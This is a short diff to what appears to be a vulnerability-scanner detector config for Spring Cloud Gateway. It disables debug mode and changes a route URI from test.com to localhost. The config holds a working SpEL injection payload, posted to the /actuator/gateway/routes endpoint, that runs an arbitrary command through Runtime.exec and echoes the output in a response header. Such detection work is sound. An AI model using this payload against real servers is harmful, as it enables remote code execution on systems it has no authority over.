@@ -40,7 +40,7 @@ finding: {
   }
 }
 
-config: { debug: true }
+config: {}
 
 ###########
 # ACTIONS #
@@ -53,7 +53,7 @@ actions: {
   http_request: {
     method: POST
     uri: "/actuator/gateway/routes/{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
-    data: '{"id":"{{ T_UTL_CURRENT_TIMESTAMP_MS }}","filters":[{"name":"AddResponseHeader","args":{"name":"Result=","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\\\"{{ PAYLOAD }}\\\").getInputStream()))}"}}],"uri":"http://test.com"}'
+    data: '{"id":"{{ T_UTL_CURRENT_TIMESTAMP_MS }}","filters":[{"name":"AddResponseHeader","args":{"name":"Result=","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\\\"{{ PAYLOAD }}\\\").getInputStream()))}"}}],"uri":"http://localhost"}'
     headers: [
       { name: "Content-Type" value: "application/json" }
     ]
